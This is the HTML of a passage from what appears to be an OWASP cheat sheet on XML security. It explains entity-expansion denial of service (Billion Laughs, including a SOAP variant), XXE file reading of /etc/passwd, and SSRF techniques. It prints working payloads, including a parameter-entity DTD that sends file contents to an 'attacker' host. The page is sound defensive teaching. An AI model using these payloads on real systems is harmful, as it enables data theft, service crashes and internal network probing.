<span class="cp"> &lt;!ELEMENT root ANY&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY A &quot;AAAAA...(a 100.000 A&#39;s)...AAAAA&quot;&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;A;&amp;A;&amp;A;&amp;A;</span>...(a<span class="w"> </span>100.000<span class="w"> </span><span class="ni">&amp;A;</span>&#39;s)...<span class="ni">&amp;A;&amp;A;&amp;A;&amp;A;&amp;A;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div>
<h4 id="billion-laughs">Billion Laughs<a class="headerlink" href="#billion-laughs" title="Permanent link">&para;</a></h4>
<p><strong>When an XML parser tries to resolve the external entities included within the following code, it will cause the application to start consuming all of the available memory until the process crashes.</strong> This is an example XML document with an embedded <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> schema including the attack:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE root [</span>
<span class="cp"> &lt;!ELEMENT root ANY&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL &quot;LOL&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL1 &quot;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL2 &quot;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL3 &quot;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL4 &quot;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL5 &quot;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL6 &quot;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL7 &quot;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL8 &quot;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL9 &quot;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&quot;&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;LOL9;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div>
<p>The entity <code>LOL9</code> will be resolved as the 10 entities defined in <code>LOL8</code>; then each of these entities will be resolved in <code>LOL7</code> and so on. Finally, the CPU and/or memory will be affected by parsing the <code>3 x 10^9</code> (3,000,000,000) entities defined in this schema, which could make the parser crash.</p>
<p><strong>The Simple Object Access Protocol (<a href="https://en.wikipedia.org/wiki/SOAP">SOAP</a>) specification forbids <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>s completely. This means that a SOAP processor can reject any SOAP message that contains a <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>. Despite this specification, certain SOAP implementations did parse <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> schemas within SOAP messages.</strong></p>
<p>The following example illustrates a case where the parser is not following the specification, enabling a reference to a <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> in a SOAP message:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?XML VERSION=&quot;1.0&quot; ENCODING=&quot;UTF-8&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE SOAP-ENV:ENVELOPE [</span>
<span class="cp"> &lt;!ELEMENT SOAP-ENV:ENVELOPE ANY&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL &quot;LOL&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL1 &quot;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL2 &quot;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL3 &quot;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL4 &quot;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL5 &quot;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL6 &quot;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL7 &quot;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL8 &quot;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY LOL9 &quot;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&quot;&gt;</span>
]&gt;
<span class="nt">&lt;SOAP:ENVELOPE</span><span class="w"> </span><span class="na">ENTITYREFERENCE=</span><span class="s">&quot;&amp;LOL9;&quot;</span>
<span class="w">               </span><span class="na">XMLNS:SOAP=</span><span class="s">&quot;HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/&quot;</span><span class="nt">&gt;</span>
<span class="w"> </span><span class="nt">&lt;SOAP:BODY&gt;</span>
<span class="w">  </span><span class="nt">&lt;KEYWORD</span><span class="w"> </span><span class="na">XMLNS=</span><span class="s">&quot;URN:PARASOFT:WS:STORE&quot;</span><span class="nt">&gt;</span>FOO<span class="nt">&lt;/KEYWORD&gt;</span>
<span class="w"> </span><span class="nt">&lt;/SOAP:BODY&gt;</span>
<span class="nt">&lt;/SOAP:ENVELOPE&gt;</span>
</code></pre></div>
<h4 id="reflected-file-retrieval">Reflected File Retrieval<a class="headerlink" href="#reflected-file-retrieval" title="Permanent link">&para;</a></h4>
<p>Consider the following example code of an XXE:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [</span>
<span class="cp"> &lt;!ELEMENT includeme ANY&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot;&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div>
<p><strong>The previous XML defines an entity named <code>xxe</code>, which is in fact the contents of <code>/etc/passwd</code>, which will be expanded within the <code>includeme</code> tag. If the parser allows references to external entities, it might include the contents of that file in the XML response or in the error output.</strong></p>
<h4 id="server-side-request-forgery">Server Side Request Forgery<a class="headerlink" href="#server-side-request-forgery" title="Permanent link">&para;</a></h4>
<p><strong>Server Side Request Forgery (SSRF) happens when the server receives a malicious XML schema, which makes the server retrieve remote resources such as a file via HTTP/HTTPS/FTP, etc.</strong> SSRF has been used to retrieve remote files, to prove a XXE when you cannot reflect back the file or perform port scanning, or perform brute force attacks on internal networks.</p>
<h5 id="external-dns-resolution">External DNS Resolution<a class="headerlink" href="#external-dns-resolution" title="Permanent link">&para;</a></h5>
<p><strong>Sometimes it is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.</strong> This is one of the simplest forms of SSRF, but requires the attacker to analyze the DNS traffic. Burp has a plugin that checks for this attack.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE m PUBLIC &quot;-//B/A/EN&quot; &quot;http://checkforthisspecificdomain.example.com&quot;&gt;</span>
</code></pre></div>
<h5 id="external-connection">External Connection<a class="headerlink" href="#external-connection" title="Permanent link">&para;</a></h5>
<p>Whenever there is an XXE and you cannot retrieve a file, you can test if you would be able to establish remote connections:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [</span>
<span class="cp"> &lt;!ENTITY % xxe SYSTEM &quot;http://attacker/evil.dtd&quot;&gt;</span>
<span class="w"> </span>%xxe;
]&gt;
</code></pre></div>
<h5 id="file-retrieval-with-parameter-entities">File Retrieval with Parameter Entities<a class="headerlink" href="#file-retrieval-with-parameter-entities" title="Permanent link">&para;</a></h5>
<p>Parameter entities allows for the retrieval of content using URL references. Consider the following malicious XML document:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [</span>
<span class="cp"> &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY % dtd SYSTEM &quot;http://attacker/evil.dtd&quot;&gt;</span>
<span class="w"> </span>%dtd;
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;send;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div>
<p>Here the <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> defines two external parameter entities: <code>file</code> loads a local file, and <code>dtd</code> which loads a remote <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>. The remote <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> should contain something like this:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="cp">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://example.com/?%file;&#39;&gt;</span>&quot;&gt;
%all;
</code></pre></div>
<p>The second <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> causes the system to send the contents of the <code>file</code> back to the attacker's server as a parameter of the URL.</p>
<h5 id="port-scanning">Port Scanning<a class="headerlink" href="#port-scanning" title="Permanent link">&para;</a></h5>
<p>The amount and type of information generated by port scanning will depend on the type of implementation. Responses can be classified as follows, ranking from easy to complex:</p>
<p><strong>1) Complete Disclosure</strong>: This is the simplest and most unusual scenario, with complete disclosure you can clearly see what's going on by receiving the complete responses from the server being queried. You have an exact representation of what happened when connecting to the remote host.</p>
<p><strong>2) Error-based</strong>: If you are unable to see the response from the remote server, you may be able to use the information generated by the error response. Consider a web service leaking details on what went wrong in the SOAP Fault element when trying to establish a connection:</p>
<div class="highlight"><pre><span></span><code>java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
 at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
</code></pre></div>
<p><strong>3) Timeout-based</strong>: The scanner could generate timeouts when it connects to open or closed ports depending on the schema and the underlying implementation. If the timeouts occur while you are trying to connect to a closed port (which may take one minute), the time of response when connected to a valid port will be very quick (one second, for example). The differences between open and closed ports becomes quite clear.</p>
<p><strong>4) Time-based</strong>: Sometimes it may be difficult to tell the differences between closed and open ports because the results are very subtle. The only way to know the status of a port with certainty would be to take multiple measurements of the time required to reach each host, then you should analyze the average time for each port to determinate the status of each port. This type of attack will be difficult to accomplish if it is performed in higher latency networks.</p>
<h5 id="brute-forcing">Brute Forcing<a class="headerlink" href="#brute-forcing" title="Permanent link">&para;</a></h5>
<p><strong>Once an attacker confirms that it is possible to perform a port scan, performing a brute force attack is a matter of embedding the <code>username</code> and <code>password</code> as part of the URI scheme (http, ftp, etc).</strong> For example, see the following example:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE root [</span>
<span class="cp"> &lt;!ENTITY user SYSTEM &quot;http://username:password@example.com:8080&quot;&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;user;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      ©Copyright <script>document.write(new Date().getFullYear())</script> - Cheat Sheets Series Team - This work is licensed under <a rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International</a>.
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.sections", "navigation.expand"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../assets/javascripts/bundle.83f73b43.min.js"></script>
      
    
  </body>
</html>